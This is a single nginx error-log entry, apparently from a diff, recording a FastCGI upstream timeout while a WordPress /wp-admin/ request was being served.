+2024/05/31 10:54:55 [error] 28#28: *11 upstream timed out (110: Connection timed out) while reading response header from upstream, client: 125.63.73.50, server: , request: "GET /wp-admin/ HTTP/1.1", upstream: "fastcgi://192.168.16.2:9000", host: "18.236.154.22"
